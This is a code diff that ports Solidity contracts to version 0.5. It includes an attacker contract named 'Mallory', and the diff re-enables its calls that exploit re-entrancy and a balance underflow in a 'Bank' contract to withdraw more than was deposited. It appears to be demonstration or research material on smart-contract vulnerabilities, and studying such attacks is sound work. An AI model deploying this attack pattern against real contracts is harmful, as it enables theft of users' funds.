@@ -1,8 +1,10 @@
-pragma solidity ^0.5;
+pragma solidity 0.5;
+/*pragma solidity ^0.4.21;*/
 
 contract IntermediaryCallback {
+    function registerIntermediary(address payable what) public payable;
     // for solidity 0.4.21
-    function registerIntermediary(address what) public payable;
+    /*function registerIntermediary(address what) public payable;*/
 }
 
 contract Intermediary {
@@ -13,8 +15,9 @@ contract Intermediary {
     Bank bank;
     uint amount;
 
+    constructor(Bank _bank, address _owner, uint _amount) public {
     // for solidity 0.4.21
-    function Intermediary(Bank _bank, address _owner, uint _amount) public {
+    /*function Intermediary(Bank _bank, address _owner, uint _amount) public {*/
         owner = _owner;
         bank = _bank;
         amount = _amount;
@@ -73,21 +76,22 @@ contract Mallory is IntermediaryCallback {
         state = 0;
         bank = b;
         // first deposit some ether
-        //bank.deposit.value(amount)();
+        bank.deposit.value(amount)();
         // then withdraw it again. This will create a new Intermediary contract, which
         // holds the funds until we retrieve it. This will trigger the
         // registerIntermediary callback.
-        //bank.withdraw(bank.getBalance(address(this)));
+        bank.withdraw(bank.getBalance(address(this)));
         // finally withdraw all the funds from our Intermediarys
-        //i1.withdraw();
-        //i2.withdraw();
+        i1.withdraw();
+        i2.withdraw();
 
         // note that bank.balances[this] has underflowed by now, so we will see
         // also a huge balances entry for the Mallory contract.
     }
 
+    function registerIntermediary(address payable what) public payable {
     // for solidity 0.4.21
-    function registerIntermediary(address what) public payable {
+    /*function registerIntermediary(address what) public payable {*/
         // called by the newly created Intermediary contracts
         if (state == 0) {
             // we do not want to loop the re-entrancy until we run out of gas,
